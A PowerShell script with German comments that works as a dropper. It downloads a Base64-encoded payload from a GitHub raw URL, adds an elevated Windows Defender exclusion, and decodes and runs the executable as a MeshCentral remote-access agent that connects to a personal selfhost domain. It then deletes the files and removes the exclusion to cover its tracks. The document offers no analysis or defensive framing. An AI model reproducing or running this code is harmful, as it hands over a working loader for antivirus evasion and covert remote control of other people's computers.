# URL der Base64-kodierten Datei auf dem Webserver
$fileUrl = "https://raw.githubusercontent.com/Lorcan84/test/main/app"

# Pfad zum Herunterladen der Base64-kodierten Datei
$downloadPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "Base64String.txt")

# Herunterladen der Datei von einem Webserver
try {
    #$ProgressPreference = "SilentlyContinue"
    Invoke-WebRequest -Uri $fileUrl -OutFile $downloadPath
    Write-Output "Datei von Webserver heruntergeladen: $downloadPath"
} catch {
    Write-Error "Fehler beim Herunterladen der Datei: $_"
    exit 1
}

# Überprüfen, ob die Datei erfolgreich heruntergeladen wurde
if (-Not (Test-Path $downloadPath)) {
    Write-Error "Die heruntergeladene Datei wurde nicht gefunden: $downloadPath"
    exit 1
}

# Definiere den Pfad zur temporären Datei
$tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "temp_executable.exe")

# Erstelle eine Ausnahme im Windows Defender für den spezifischen Pfad
$exceptionCommand = "Add-MpPreference -ExclusionPath '$tempFilePath'"
Start-Process powershell -ArgumentList "-Command $exceptionCommand" -Verb RunAs -Wait

Write-Output "Ausnahme für Windows Defender hinzugefügt: $tempFilePath"

# Base64-kodierter String (aus der heruntergeladenen Datei)
$base64String = Get-Content $downloadPath -Raw

# Überprüfen, ob der Base64-String geladen wurde
if ([string]::IsNullOrEmpty($base64String)) {
    Write-Error "Der Base64-String konnte nicht geladen werden."
    exit 1
}

# Base64-Dekodierung
try {
    $bytes = [Convert]::FromBase64String($base64String)
    Write-Output "Base64-Dekodierung erfolgreich."
} catch {
    Write-Error "Fehler bei der Base64-Dekodierung: $_"
    exit 1
}

# Temporäre Datei schreiben
try {
    [System.IO.File]::WriteAllBytes($tempFilePath, $bytes)
    Write-Output "Temporäre Datei erstellt unter: $tempFilePath"

# Definiere die Kommandozeilenparameter als eine Zeichenkette, wobei die Parameter in doppelte Anführungszeichen eingeschlossen werden
$params = "-fullinstall --Meshserver=wss://lorcan.selfhost.eu:443/agent.ashx"

Start-Process -FilePath $tempFilePath -ArgumentList $params -NoNewWindow -Wait

# Führe die .exe-Datei mit den Parametern aus
#& $tempFilePath $params


    # Definiere die Kommandozeilenparameter
    #$params = "-fullinstall --Meshserver=wss://lorcan.selfhost.eu:443/agent.ashx"

    # Führe die .exe-Datei mit den Parametern aus
   # & $tempFilePath $params

    # Führe die .exe-Datei aus
    #& $tempFilePath

    # Warte, bis der Prozess beendet ist
    Start-Sleep -Seconds 5
} catch {
    Write-Error "Fehler beim Ausführen der Datei: $_"
} finally {
    # Lösche die temporäre Datei
    if (Test-Path $tempFilePath) {
        Remove-Item $tempFilePath
        Write-Output "Temporäre Datei gelöscht."
    }
}

# Entferne die Ausnahme aus Windows Defender
$removeExceptionCommand = "Remove-MpPreference -ExclusionPath '$tempFilePath'"
Start-Process powershell -ArgumentList "-Command $removeExceptionCommand" -Verb RunAs -Wait

Write-Output "Ausnahme für Windows Defender entfernt: $tempFilePath"

# Entferne die heruntergeladene Base64-Datei
if (Test-Path $downloadPath) {
    Remove-Item $downloadPath
    Write-Output "Heruntergeladene Datei gelöscht: $downloadPath"
}
